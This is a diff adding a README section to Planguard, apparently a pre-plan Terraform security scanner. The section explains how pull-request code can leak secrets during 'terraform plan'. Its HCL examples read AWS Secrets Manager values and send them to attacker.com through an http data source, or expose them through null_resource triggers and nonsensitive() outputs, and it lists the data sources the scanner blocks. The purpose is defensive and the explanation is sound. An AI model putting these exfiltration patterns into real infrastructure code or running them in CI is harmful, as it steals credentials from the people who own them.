@@ -13,6 +13,132 @@ Pre-plan Terraform security scanner with HCL-based configuration. Catch security
 - ✅ **Extensible** - Add custom rules without code changes
 - ✅ **Multiple output formats** - Text, JSON, SARIF
 
+## 🚨 Why Scan Before Plan? Preventing Secret Exfiltration
+
+**Critical Security Issue**: Terraform's `plan` stage can exfiltrate secrets. Anyone with permission to create a PR can potentially steal sensitive data before code review.
+
+### The Attack: Exfiltrating Secrets During Plan
+
+When someone opens a PR, CI runs `terraform plan`. But data sources **execute during plan** - before you review the code. An attacker can read secrets and send them out:
+
+```hcl
+# Step 1: Fetch secrets from AWS Secrets Manager (runs during plan)
+data "aws_secretsmanager_secret_version" "db_creds" {
+  secret_id = "production/database/master"
+}
+
+# Step 2: Exfiltrate via HTTP data source (runs during plan)
+data "http" "exfil" {
+  url = "https://attacker.com/steal?creds=${data.aws_secretsmanager_secret_version.db_creds.secret_string}"
+}
+```
+
+Or use a more subtle approach with `null_resource` triggers that appear in plan output:
+
+```hcl
+# Attacker's "innocent looking" debug code
+data "aws_secretsmanager_secret_version" "api_key" {
+  secret_id = "prod/api/key"
+}
+
+resource "null_resource" "debug" {
+  triggers = {
+    # This appears in plan output and CI logs
+    api_key = data.aws_secretsmanager_secret_version.api_key.secret_string
+  }
+}
+```
+
+When this runs, the plan output shows:
+```
+# null_resource.debug will be created
++ resource "null_resource" "debug" {
+    + triggers = {
+        + api_key = "sk_live_51Hj8..." # SECRET EXPOSED IN LOGS!
+      }
+  }
+```
+
+### Even More Subtle: nonsensitive() in Outputs
+
+The `nonsensitive()` function strips the sensitive marker, exposing secrets in plan output that gets logged everywhere:
+
+```hcl
+# Fetch production database credentials
+data "aws_secretsmanager_secret_version" "db" {
+  secret_id = "prod/db/master"
+}
+
+# "Debug" output that leaks secrets
+output "debug_connection" {
+  value = nonsensitive(jsondecode(data.aws_secretsmanager_secret_version.db.secret_string))
+}
+```
+
+Plan output exposes the secret:
+```
+Changes to Outputs:
+  + debug_connection = {
+      + password = "SuperSecret123!"
+      + username = "admin"
+    }
+```
+
+**This secret is now in:**
+- CI logs (GitHub Actions, Jenkins, etc.)
+- S3 plan files
+- CloudWatch Logs
+- Any log aggregation system
+- Visible to anyone with CI access
+
+### Attack Timeline
+
+1. **Attacker opens PR** with malicious Terraform code
+2. **CI runs `terraform plan`** automatically
+3. **Data sources execute** during plan (before code review)
+4. **Secrets are fetched** from Secrets Manager
+5. **Secrets exfiltrated** via HTTP/DNS/logs
+6. **No resources created** - plan shows "no changes", looks safe
+7. **Attacker has secrets** - extracted from CI logs
+
+### The Solution: Pre-Plan Scanning
+
+Run Planguard **before** `terraform plan`:
+
+```yaml
+# In CI: Scan BEFORE plan
+- name: Planguard Security Scan
+  uses: jonathanhle/planguard@v1
+  with:
+    directory: terraform/
+    fail-on: error
+
+# Only run plan if scan passes
+- name: Terraform Plan
+  run: terraform plan
+```
+
+**Planguard's default rules block**:
+- ✅ `data "http"` - Can exfiltrate via URL params
+- ✅ `data "external"` - Can execute arbitrary commands
+- ✅ `data "dns"` - Can leak via DNS queries
+- ✅ `nonsensitive()` - Exposes secrets in plan output/logs
+
+### Impact
+
+**Without Planguard:**
+- Anyone with PR access can steal secrets
+- Secrets exposed in CI logs and artifacts
+- No protection against insider threats
+
+**With Planguard:**
+- ✅ Blocks exfiltration before plan runs
+- ✅ Detects malicious patterns in PRs
+- ✅ Prevents secrets from appearing in logs
+- ✅ Audit trail for security exceptions
+
+**Best Practice**: Run Planguard in CI on every PR, before `terraform plan`, to ensure Terraform code is safe to execute.
+
 ## Quick Start
 
 ### As GitHub Action
